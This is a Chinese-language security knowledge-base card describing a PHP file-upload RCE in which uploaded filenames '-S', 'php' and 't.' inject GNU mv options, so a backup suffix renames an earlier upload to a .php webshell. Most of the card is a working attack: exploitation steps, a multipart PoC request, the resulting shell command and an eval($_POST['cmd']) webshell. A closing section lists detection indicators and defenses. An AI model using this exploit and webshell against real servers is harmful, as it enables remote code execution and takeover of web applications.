---
id: web-php-rce-mv-option-injection-suffix-webshell
title: 上传文件名注入 mv -S 选项，利用备份后缀把脚本文件改名为 .php
type: scenario
domain: web
path: web/php/rce
technique: mv-option-injection-backup-suffix
aliases:
- mv -S 通配符注入
- 文件名选项注入
- 备份后缀 getshell
- 多文件上传 mv *
- mv suffix webshell
tags:
- php
- rce
- command-injection
- option-injection
- file-upload
- mv
- glob
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:33:36+08:00'
  notes: 已对照原文与图15-19核对：源码 exec("cd $uploadDir ; mv * $targetDir 2>&1")、文件名 -S/php/t. 的顺序、目标目录预置 t.、最终 t. 与 t.php 并存均与图一致；本机复现 GNU mv -S php t. dest/ 在 dest 已有 t. 时确实生成 t.php（旧内容），卡片机制成立。原文未涉及版本区间。PoC 未在目标环境执行。
---

## 一句话结论

PHP 用 `exec("cd $uploadDir ; mv * $targetDir")` 移动用户上传的文件时，文件名会参与 shell 通配符展开；上传名为 `-S`、`php`、`t.` 的文件（并预先在目标目录放同名 `t.`），命令变成 `mv -S php t. /target/`，`-S php` 把备份后缀设为 `php`，目标目录旧的 `t.` 被备份成 `t.php`，内容即攻击者上传的脚本。

## 原理

- `exec("cd $uploadDir ; mv * $targetDir 2>&1")` 中 `*` 由 shell 展开为上传目录下的所有文件名，文件名完全由 multipart 的 `filename` 控制。
- shell 展开后按字典序拼接参数。上传 `-S`、`php`、`t.` 后，命令实际为 `mv -S php t. /var/www/html/upload/`。
- GNU `mv` 的 `-S, --suffix=SUFFIX` 用于指定备份文件后缀。带上 `-S php` 后，`mv` 把 `t.` 作为源、目标目录作为目的地；目标目录已存在同名 `t.` 时，先把旧目标备份为 `t.php`（原文件名 `t.` 加上后缀 `php`），再放入新的 `t.`。
- 因此旧 `t.` 的内容（第一步上传的 PHP 脚本）以 `t.php` 落盘，Web 服务器按 `.php` 解析执行。
- 文件名顺序很关键：`t.` 必须排在 `php` 之后、且目标目录预先存在 `t.`；换成 `1.` 等名字会打乱字典序，命令不再按预期解析。
- 根因是“数据（文件名）被当成命令行选项”：程序只检查扩展名黑名单，没有阻止以 `-` 开头的文件名，也没有在 `mv` 前加 `--`。

## 触发条件

- 应用把用户上传的文件名原样保存，并用 shell 的 `mv * <dir>`（或类似通配符命令）移动文件；
- 运行环境为 GNU coreutils 的 `mv`，支持 `-S`/`--suffix`；
- 攻击者可控制多个文件名，且能先让目标目录存在一个同名文件；
- 上传目录中的文件内容可控（脚本），目标目录可被 Web 解析。

## 利用步骤

1. 确认移动逻辑为 `mv * <target>`，且文件名未过滤 `-` 开头。
2. 第一步：上传内容为 `<?php eval($_POST['cmd']);?>` 的文件，文件名设为 `t.`；触发移动到目标目录，使 `/target/t.` 存在。
3. 第二步：用 Burp 构造多文件上传，文件名分别为 `-S`、`php`、`t.`（内容任意，`-S`/`php` 可为空）。
4. 触发“确认移动”，shell 执行 `mv -S php t. /target/`；目标目录出现 `t.php`（旧 `t.` 的备份）。
5. 访问 `/target/t.php`，用 POST 参数执行命令。

## PoC

多文件上传的 multipart 片段：

```http
POST /upload.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="files[]"; filename="-S"
Content-Type: application/octet-stream

x
------X
Content-Disposition: form-data; name="files[]"; filename="php"
Content-Type: application/octet-stream

x
------X
Content-Disposition: form-data; name="files[]"; filename="t."
Content-Type: application/octet-stream

x
------X--
```

触发移动后实际命令：

```bash
cd /tmp/upload/ ; mv -S php t. /var/www/html/upload/
```

结果：

```text
/var/www/html/upload/t.     (新放入)
/var/www/html/upload/t.php  (旧 t. 的备份，内容为第一步的 PHP 脚本)
```

第一步上传的 `t.` 内容：

```php
<?php eval($_POST['cmd']); ?>
```

成功标志：访问 `/upload/t.php` 返回命令执行结果。

## 变体与关联

- 变体：用 `--suffix=php` 代替 `-S php`，但文件名需要能包含 `=`，且 glob 展开后参数形态不同，按实际 shell 解析测试。
- 变体：`-t <dir>` 可把目标目录改为攻击者指定目录；`-b`/`--backup` 配合 `--suffix` 也能生成备份文件。
- 变体：若移动命令不是 `mv *` 而是循环 `for f in *; do mv $f ...; done`，同样可利用文件名选项注入，只是每次只带一个参数。
- 关联：[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（同为上传/命令拼接导致的 RCE）；文件上传黑名单绕过类卡片。
- 边界：如果命令使用 `mv -- *`、对文件名做 `escapeshellarg`、或拒绝以 `-` 开头的名字，本手法不成立。

## 检测与防御

- 检测：上传文件名以 `-` 开头，或出现 `-S`、`--suffix`、`-t`、`-b` 等 mv 选项名；同一批上传包含短名文件与目标目录已有文件同名。
- 检测：目标目录出现异常的 `*.php` 备份文件；`mv` 进程由 Web 服务拉起且参数含选项。
- 防御：不要用 shell 通配符移动用户文件；用 PHP 的 `rename()`/`move_uploaded_file()` 逐个处理；若必须用 shell，加 `--` 结束选项并对每个路径 `escapeshellarg`。
- 加固：重命名为服务端生成的随机名；拒绝以 `-` 开头或含路径分隔符的文件名；上传目录禁止脚本解析。
